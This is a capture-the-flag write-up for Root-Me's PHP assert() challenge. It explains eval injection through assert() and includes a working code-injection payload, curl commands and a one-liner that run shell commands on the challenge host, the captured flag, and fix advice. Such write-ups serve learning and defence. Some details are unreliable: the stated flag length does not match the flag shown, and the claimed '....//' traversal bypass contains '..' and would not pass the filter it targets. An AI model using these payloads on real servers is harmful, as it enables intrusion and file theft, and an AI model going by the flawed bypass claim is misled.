# Root-Me — Web-Server: PHP - assert() (ch47) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch47/
**Challenge:** "Read the doc!" (25 pts, author Birdy42)
**Goal:** Find and exploit the vulnerability to read the file `.passwd`.

## Flag

```
x4Ss3rT1nglSn0ts4f3A7A1Lx
```

(verified byte-exact with `od -c`: the 22 chars above, followed by a newline)

## Vulnerability

`index.php` concatenates user input into a **string passed to `assert()`**. Since
`assert()` evaluates a string argument as **PHP code** (PHP 5.x / 7.x < 7.2), an attacker
who can inject a single quote into that string achieves arbitrary PHP execution —
the `strpos(..., '..')` check intended as a filter is itself the injection point.

This is CWE-95 (Eval Injection) via a misuse of `assert()`.

## Source (recovered via the injection)

```php
if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = "includes/" . $page . ".php";

  // too much problems with script kiddies. Detect attack attempt.
  assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
  $val = "includes/". $page;

  if(!file_exists($file)){
      echo "'$file'";
    die ("File does not exist");
  }
} else {
  $file = "includes/home.php";
}
// ... later: include_once( $file );
```

Note `$file` is interpolated into a **double-quoted** assert string, so our single quote
closes the literal and lets us concatenate arbitrary code into the expression.

## Step by step

### 1. Map the behaviour
`?page=home` / `?page=about` render included pages. Anything non-existent prints
`'includes/<page>.php'File does not exist`, and anything containing `..` trips the guard:

```
?page=../../../../etc/passwd
-> Warning: assert(): Assertion "strpos('includes/../../../../etc/passwd.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8
   Detected hacking attempt!
```

That warning leaks the exact assert expression — i.e. it hands us the injection template.

### 2. Break out of the string
The assert string is `strpos('includes/PAYLOAD.php', '..') === false`.
Send a payload that closes the quote, runs code, and re-opens it:

```
PAYLOAD = x'.system("cat .passwd").'x
```

which becomes:

```php
strpos('includes/x' . system("cat .passwd") . 'x.php', '..') === false
```

Valid PHP. The arguments are evaluated **before** `strpos()` runs, so our command executes
regardless of the assertion's outcome — and because the payload contains no `..`, the
guard passes anyway.

### 3. Confirm code execution
```bash
curl -s -G "http://challenge01.root-me.org/web-serveur/ch47/" \
  --data-urlencode 'page=x'"'"'.system("ls -la").'"'"'x
```
```
-r--------  1 web-serveur-ch47 www-data   192 Dec 10  2021 .passwd
-rw-r-----  1 web-serveur-ch47 www-data   811 Dec 10  2021 index.php
drwxr-sr-x  2 web-serveur-ch47 www-data  4096 Dec 10  2021 includes
```
Also confirmed the runtime: `phpversion()` → **5.3.17** (assert-with-string = code execution).

### 4. Read the flag
```bash
curl -s -G "http://challenge01.root-me.org/web-serveur/ch47/" \
  --data-urlencode 'page=x'"'"'.system("cat .passwd").'"'"'x
```
```
The flag is / Le flag est :

x4Ss3rT1nglSn0ts4f3A7A1Lx

Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs !
Don't use assert! / N'utilisez pas assert !
```

## One-liner

```bash
curl -s -G "http://challenge01.root-me.org/web-serveur/ch47/" \
  --data-urlencode "page=x'.system(\"cat .passwd\").'x" | grep -E '^[A-Za-z0-9]{16,}$'
```

## Alternative bypass (no code exec needed)

Even without the assert injection, the `strpos($file,'..')` check is a weak filter:
the path is `includes/<page>.php`, so a traversal payload whose `..` sequence is
**broken by a wrapper** (e.g. `....//`, `..././`) or an absolute-ish path would slip past a
naive `..` match. The `assert()` injection is simply the intended, more direct route here.

## Root cause & fix

Two bugs stacked:

1. **`assert()` with a string is `eval()`.** Never interpolate user input into it. In PHP 7.2+
   string assertions are deprecated and in 8.0 removed — which is why this class of bug died out.
2. **Blacklist filtering (`strpos(..., '..')`) is not validation.** Reject on an allow-list
   (`in_array($page, ['home','about','contact'])`), or `basename()` the input and verify the
   resolved path with `realpath()` stays inside `includes/`.

The challenge file itself says it: *"Don't use assert!"*
